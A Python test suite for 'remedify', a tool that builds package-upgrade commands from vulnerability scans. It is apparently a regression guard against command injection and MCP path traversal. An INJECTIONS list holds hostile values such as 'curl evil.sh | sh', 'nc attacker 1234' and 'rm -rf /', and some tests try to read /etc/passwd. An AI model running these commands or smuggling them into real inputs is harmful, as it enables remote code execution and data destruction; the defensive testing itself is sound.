"""Trust-boundary tests. Scan results are attacker-influenced (a malicious
base image controls its own package DB), and remedify emits shell commands
from them. No scan-derived value may reach generated output in a form that
could break out of its context. Regression guard for the command-injection
class of bug."""

import json
import os
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import remedify  # noqa: E402

# Payloads a hostile package DB could carry.
INJECTIONS = [
    "libfoo$(touch /tmp/PWNED)",
    "libfoo`id`",
    "libfoo; rm -rf /",
    "libfoo && curl evil.sh | sh",
    "libfoo | nc attacker 1234",
    "libfoo\nrm -rf /",
    "libfoo\r\nmalicious",
    "$(reboot)",
    "libfoo > /etc/passwd",
    "a b c",                    # spaces would split into extra args
    "libfoo'quote",
    'libfoo"quote',
]


def trivy_with(pkg="libfoo", version="1.1", klass="os-pkgs", ptype=None):
    r = {"Class": klass,
         "Vulnerabilities": [{"PkgName": pkg, "InstalledVersion": "1.0",
                              "FixedVersion": version, "Severity": "HIGH",
                              "VulnerabilityID": "CVE-2026-0001"}]}
    if ptype:
        r["Type"] = ptype
    return {"ArtifactName": "evil-image",
            "Metadata": {"OS": {"Family": "ubuntu", "Name": "22.04"}},
            "Results": [r]}


class TestNoInjectionInOutputs(unittest.TestCase):
    SHELL_META = ["$(", "`", ";", "|", "&&", "\n", "\r", " > ", "' ", '" ']

    def _assert_clean(self, text, payload_marker="PWNED"):
        # the dangerous constructs must never appear as live shell in a command
        for line in text.splitlines():
            if line.strip().startswith(("apt-get", "dnf ", "yum ", "apk ",
                                        "zypper")):
                for meta in ("$(", "`", ";", "|", "&&", ">"):
                    self.assertNotIn(meta, line,
                                     f"shell metachar {meta!r} in command: {line}")

    def test_injected_name_never_becomes_command(self):
        for payload in INJECTIONS:
            plan = remedify.build_plan(remedify.parse_trivy(trivy_with(pkg=payload)))
            # not emitted as an OS step
            self.assertEqual(plan["steps"], [], f"payload survived: {payload!r}")
            # surfaced as rejected instead of silently dropped
            self.assertTrue(plan["rejected"], f"payload not reported: {payload!r}")
            for fmt in (remedify.render_shell, remedify.render_markdown,
                        remedify.render_ansible):
                self._assert_clean(fmt(plan))

    def test_injected_version_rejected(self):
        plan = remedify.build_plan(
            remedify.parse_trivy(trivy_with(version="1.1$(touch /tmp/x)")))
        self.assertEqual(plan["steps"], [])
        self.assertTrue(plan["rejected"])

    def test_legitimate_packages_still_pass(self):
        # must not over-reject real-world names/versions
        for pkg, ver in [("libssl3", "3.0.2-0ubuntu1.18"),
                         ("libgssapi-krb5-2", "1.20.1-2+deb12u5"),
                         ("gcc-12-base", "12.3.0-1"),
                         ("openssh", "1:9.6p1-3ubuntu13"),
                         ("linux-image-generic", "5.15.0.107.104"),
                         ("p11-kit", "0.24.1-2ubuntu0.1")]:
            plan = remedify.build_plan(remedify.parse_trivy(
                trivy_with(pkg=pkg, version=ver)))
            self.assertTrue(plan["steps"], f"over-rejected legit pkg: {pkg} {ver}")
            self.assertEqual(plan["rejected"], [])

    def test_lang_pkg_injection_rejected(self):
        # Go module paths use "/" legitimately, but shell metachars must not pass
        plan = remedify.build_plan(remedify.parse_trivy(
            trivy_with(pkg="evil$(id)/pkg", klass="lang-pkgs", ptype="gomod")))
        self.assertEqual(plan["app_steps"], [])
        self.assertTrue(plan["rejected"])

    def test_legit_lang_pkg_passes(self):
        plan = remedify.build_plan(remedify.parse_trivy(
            trivy_with(pkg="github.com/opencontainers/runc", version="v1.3.6",
                       klass="lang-pkgs", ptype="gomod")))
        self.assertTrue(plan["app_steps"])

    def test_validator_unit(self):
        self.assertTrue(remedify.is_safe_os_package("libssl3", "3.0.2-0ubuntu1.18"))
        self.assertFalse(remedify.is_safe_os_package("libfoo$(x)", "1.0"))
        self.assertFalse(remedify.is_safe_os_package("libfoo", "1.0; rm -rf /"))
        self.assertFalse(remedify.is_safe_os_package("../etc/passwd", "1.0"))

    def test_identifier_validator(self):
        self.assertTrue(remedify.is_safe_identifier("18c30b7ce5a3dc5d07f1e76da5a08cb2"))
        self.assertFalse(remedify.is_safe_identifier("../../admin"))
        self.assertFalse(remedify.is_safe_identifier("http://evil/x"))
        self.assertFalse(remedify.is_safe_identifier("a/b"))


class TestMcpFileAccess(unittest.TestCase):
    """MCP tool args are agent-controlled (prompt-injection reachable):
    scan_path must not read arbitrary files."""

    def _call(self, arguments, env=None):
        import subprocess
        script = os.path.join(os.path.dirname(__file__), "..", "remedify_mcp.py")
        msgs = [
            {"jsonrpc": "2.0", "id": 1, "method": "initialize",
             "params": {"protocolVersion": "2024-11-05", "capabilities": {},
                        "clientInfo": {"name": "t", "version": "0"}}},
            {"jsonrpc": "2.0", "id": 2, "method": "tools/call",
             "params": {"name": "generate_remediation_plan", "arguments": arguments}},
        ]
        stdin = "\n".join(json.dumps(m) for m in msgs) + "\n"
        full_env = dict(os.environ)
        full_env.pop("REMEDIFY_MCP_ALLOWED_DIR", None)
        if env:
            full_env.update(env)
        r = subprocess.run([sys.executable, script], input=stdin,
                           capture_output=True, text=True, env=full_env, timeout=60)
        return [json.loads(l) for l in r.stdout.strip().splitlines()]

    def test_scan_path_disabled_by_default(self):
        out = self._call({"scan_path": "/etc/passwd"})
        result = out[1]["result"]
        self.assertTrue(result["isError"])
        self.assertIn("disabled", result["content"][0]["text"])
        # the file's content must not appear in the response
        self.assertNotIn("root:", result["content"][0]["text"])

    def test_traversal_blocked_when_dir_allowed(self):
        import tempfile
        d = tempfile.mkdtemp()
        out = self._call({"scan_path": os.path.join(d, "..", "..", "etc", "passwd")},
                         env={"REMEDIFY_MCP_ALLOWED_DIR": d})
        result = out[1]["result"]
        self.assertTrue(result["isError"])
        self.assertNotIn("root:", result["content"][0]["text"])

    def test_allowed_file_reads(self):
        import tempfile
        d = tempfile.mkdtemp()
        p = os.path.join(d, "scan.json")
        with open(p, "w") as f:
            json.dump(trivy_with(pkg="libssl3", version="3.0.2-0ubuntu1.18"), f)
        out = self._call({"scan_path": p}, env={"REMEDIFY_MCP_ALLOWED_DIR": d})
        result = out[1]["result"]
        self.assertFalse(result["isError"], result["content"][0]["text"])
        self.assertIn("libssl3", result["content"][0]["text"])


if __name__ == "__main__":
    unittest.main()
